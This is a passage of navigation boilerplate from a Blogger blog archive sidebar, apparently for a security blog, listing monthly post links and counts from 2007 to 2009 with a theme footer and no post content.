    [April](https://ifsec.blogspot.com/2009/04/)
    (1)

* ►
  [2008](https://ifsec.blogspot.com/2008/)
  (2)
  + ►
    [October](https://ifsec.blogspot.com/2008/10/)
    (1)
  + ►
    [September](https://ifsec.blogspot.com/2008/09/)
    (1)

* ►
  [2007](https://ifsec.blogspot.com/2007/)
  (4)
  + ►
    [April](https://ifsec.blogspot.com/2007/04/)
    (2)
  + ►
    [March](https://ifsec.blogspot.com/2007/03/)
    (2)

|  |  |
| --- | --- |

Simple theme. Powered by [Blogger](https://www.blogger.com).


